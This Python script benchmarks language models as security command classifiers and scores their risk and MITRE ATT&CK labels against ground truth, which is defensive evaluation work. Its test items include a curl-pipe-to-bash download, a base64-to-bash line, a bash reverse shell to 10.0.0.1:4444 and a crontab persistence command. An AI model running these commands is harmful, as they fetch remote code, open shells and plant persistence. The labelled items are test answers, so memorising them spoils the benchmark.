#!/usr/bin/env python3
"""Model selection benchmark — quality (risk/technique/intent) vs latency.

Runs every (model, test) pair concurrently with a hard per-request timeout so
no single hanging model blocks the sweep. Writes configs/model_bench.json.
"""
from __future__ import annotations

import json
import time
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

from schema_v1 import all_label_ids, group_offsets

BASE = "https://ai-api-gateway.app.baizhi.cloud/api/openai/chat/completions"
KEY = Path(".key").read_text().strip()
REQUEST_TIMEOUT = 25  # seconds per request

# Candidate models — all currently advertised by the gateway, minus embeddings.
MODELS = [
    "qwen-flash",
    "deepseek-v4-flash",
    "deepseek-flash",
    "vip/kimi-k2.7-code",
    "deepseek-v4-pro",
    "vip/glm-5.2",
    "glm-5.3-flash",
    "gpt-5.4-mini",
    "gpt-5.6-luna",
    "gpt-5.6-sol",
    "gpt-6-luna",
    "gpt-6-sol",
    "vip/qwen3.7-max",
    "general/qwen3.6-plus",
    "vip/mimo-v2.5-pro",
]

_OFF = group_offsets()
_ID = all_label_ids()
_RISK = list(_ID[_OFF["risk"][0] : _OFF["risk"][1]])
_INTENT = list(_ID[_OFF["intent"][0] : _OFF["intent"][1]])
_TACTIC = list(_ID[_OFF["tactic"][0] : _OFF["tactic"][1]])
_TECH = list(_ID[_OFF["technique"][0] : _OFF["technique"][1]])

LABEL_BLOCK = (
    "risk labels (choose exactly one): " + ", ".join(_RISK) + "\n"
    "intent labels (multi-label, choose any): " + ", ".join(_INTENT) + "\n"
    "tactic labels (multi-label): " + ", ".join(_TACTIC) + "\n"
    "technique labels (multi-label, MITRE ATT&CK ids): " + ", ".join(_TECH)
)

SYSTEM = (
    "You are a security command classifier. Output ONLY a JSON object with keys: "
    "risk (exactly one risk label), intents (array of intent labels), "
    "tactics (array of tactic labels), techniques (array of technique labels). "
    "Use ONLY the exact label ids provided. Do not invent labels. "
    "No markdown, no commentary."
)

PROMPT = SYSTEM + "\n\n" + LABEL_BLOCK + "\n\nCommand: {cmd}"

# Tests with canonical ground truth.
TESTS = [
    {"cmd": "df -h && free -m && uptime", "risk": "risk.benign", "tech": []},
    {"cmd": "curl -fsSL https://raw.githubusercontent.com/x/y/main/i.sh | bash",
     "risk": "risk.malicious", "intents": ["intent.download_execute"],
     "tactics": ["tactic.execution"], "tech": ["technique.T1105", "technique.T1059"]},
    {"cmd": "echo aGk= | base64 -d | bash", "risk": "risk.malicious",
     "intents": ["intent.encode_obfuscate", "intent.execute"], "tech": ["technique.T1027.010", "technique.T1059"]},
    {"cmd": "sudo systemctl restart nginx", "risk": "risk.benign", "tech": []},
    {"cmd": "find / -perm -4000 -type f 2>/dev/null", "risk": "risk.suspicious",
     "tactics": ["tactic.discovery", "tactic.privilege_escalation"], "tech": []},
    {"cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "risk": "risk.malicious",
     "intents": ["intent.reverse_shell"], "tactics": ["tactic.command_and_control"],
     "tech": ["technique.T1059", "technique.T1071.001"]},
    {"cmd": "(crontab -l; echo '* * * * * /tmp/.x') | crontab -", "risk": "risk.malicious",
     "intents": ["intent.persistence", "intent.scheduled_task"], "tactics": ["tactic.persistence"],
     "tech": ["technique.T1053.003"]},
    {"cmd": "apt-get install -y netcat-openbsd python3-pip", "risk": "risk.benign", "tech": []},
]


def _call(model: str, prompt: str):
    body = {"model": model, "messages": [{"role": "user", "content": prompt}], "temperature": 0}
    req = urllib.request.Request(
        BASE,
        data=json.dumps(body).encode(),
        headers={"Authorization": f"Bearer {KEY}", "Content-Type": "application/json"},
        method="POST",
    )
    t0 = time.time()
    with urllib.request.urlopen(req, timeout=REQUEST_TIMEOUT) as r:
        data = json.loads(r.read())
    dt = time.time() - t0
    content = (data.get("choices") or [{}])[0].get("message", {}).get("content") or ""
    return content, dt, None


def call(model: str, prompt: str):
    try:
        return _call(model, prompt)
    except Exception as e:
        return None, 0.0, str(e)[:80]


def _parse(text: str | None):
    if not text:
        return None
    t = text.strip()
    if t.startswith("```"):
        segs = t.split("```")
        t = segs[1] if len(segs) > 1 else t
        t = t.removeprefix("json")
    i, j = t.find("{"), t.rfind("}")
    if i == -1 or j == -1:
        return None
    try:
        return json.loads(t[i : j + 1])
    except Exception:
        return None


def _norm(x) -> str:
    return str(x).strip().lower().replace("_", " ")


def _hit(got: list[str] | None, want: str) -> bool:
    if not got:
        return False
    w = want.lower()
    for g in got:
        gs = str(g).strip().lower()
        # tolerate full-id, short suffix, or without group prefix
        if gs == w or gs == w.split(".", 1)[-1] or gs == w.replace(".", "", 1) or w.endswith(gs) and "." in w:
            return True
        # technique: accept Txxxx vs technique.Txxxx
        if gs.replace("technique.", "").replace("t", "", 1) == w.replace("technique.", "").replace("t", "", 1):
            return True
    return False


def score_one(model: str, t: dict):
    content, dt, err = call(model, PROMPT.format(cmd=t["cmd"]))
    if err:
        return {"lat": dt, "error": err}
    p = _parse(content)
    if p is None:
        return {"lat": dt, "unparsed": True, "raw": content[:120]}
    risk = str(p.get("risk", ""))
    intents = p.get("intents") or []
    tactics = p.get("tactics") or []
    techs = p.get("techniques") or []
    ok_risk = _hit([risk], t["risk"])
    ok_intent = any(_hit(intents, w) for w in (t.get("intents") or [])) if t.get("intents") else None
    ok_tactic = any(_hit(tactics, w) for w in (t.get("tactics") or [])) if t.get("tactics") else None
    ok_tech = any(_hit(techs, w) for w in (t.get("tech") or [])) if t.get("tech") else None
    return {"lat": dt, "ok_risk": ok_risk, "ok_intent": ok_intent, "ok_tactic": ok_tactic,
            "ok_tech": ok_tech, "risk": risk, "techs": techs}


def main():
    jobs = [(m, t) for m in MODELS for t in TESTS]
    results: dict[str, list] = {m: [] for m in MODELS}
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=24) as ex:
        futs = {ex.submit(score_one, m, t): (m, t) for m, t in jobs}
        for fut in as_completed(futs, timeout=len(jobs) * REQUEST_TIMEOUT + 120):
            m, t = futs[fut]
            try:
                results[m].append(fut.result())
            except Exception as e:
                results[m].append({"error": str(e)[:80]})

    rows = []
    for m in MODELS:
        rs = results[m]
        n = len(rs)
        ok = [r for r in rs if "ok_risk" in r]
        parsed = [r for r in rs if ("ok_risk" in r) or ("unparsed" in r)]
        errs = [r for r in rs if "error" in r]
        lats = [r["lat"] for r in rs if r.get("lat")]
        risk_ok = sum(r["ok_risk"] for r in ok)
        risk_den = len(ok)
        tech_ok = sum(r["ok_tech"] for r in ok if r["ok_tech"] is not None)
        tech_den = len([r for r in ok if r["ok_tech"] is not None])
        intent_ok = sum(r["ok_intent"] for r in ok if r["ok_intent"] is not None)
        intent_den = len([r for r in ok if r["ok_intent"] is not None])
        tactic_ok = sum(r["ok_tactic"] for r in ok if r["ok_tactic"] is not None)
        tactic_den = len([r for r in ok if r["ok_tactic"] is not None])
        avg_lat = sum(lats) / len(lats) if lats else 999.0
        score = (
            0.5 * (risk_ok / risk_den if risk_den else 0)
            + 0.3 * (tech_ok / tech_den if tech_den else 0)
            + 0.1 * (intent_ok / intent_den if intent_den else 0)
            + 0.1 * (tactic_ok / tactic_den if tactic_den else 0)
        )
        rows.append({
            "model": m, "risk": f"{risk_ok}/{risk_den}", "risk_acc": round(risk_ok / risk_den, 3) if risk_den else 0,
            "tech": f"{tech_ok}/{tech_den}", "tech_acc": round(tech_ok / tech_den, 3) if tech_den else 0,
            "intent": f"{intent_ok}/{intent_den}", "tactic": f"{tactic_ok}/{tactic_den}",
            "parsed": f"{len(parsed)}/{n}", "errors": len(errs), "avg_lat_s": round(avg_lat, 2), "score": round(score, 3),
        })

    rows.sort(key=lambda r: (-r["score"], r["avg_lat_s"]))
    print(f"{'model':22s} {'risk':>6s} {'tech':>6s} {'intent':>7s} {'tactic':>7s} {'parsed':>7s} {'err':>3s} {'lat':>7s} {'score':>6s}")
    print("-" * 90)
    for r in rows:
        print(f"{r['model']:22s} {r['risk']:>6s} {r['tech']:>6s} {r['intent']:>7s} {r['tactic']:>7s} {r['parsed']:>7s} {r['errors']:>3d} {r['avg_lat_s']:6.2f}s {r['score']:6.3f}")
    print("\n=== Final ranking ===")
    for i, r in enumerate(rows, 1):
        mark = " ★" if i <= 3 else ""
        print(f"{i:2d}. {r['model']:22s} score={r['score']:.3f} lat={r['avg_lat_s']}s{mark}")
    Path("configs").mkdir(exist_ok=True)
    Path("configs/model_bench.json").write_text(json.dumps(rows, indent=2, ensure_ascii=False))
    print(f"\nwall time: {time.time()-t0:.1f}s → configs/model_bench.json")


if __name__ == "__main__":
    main()
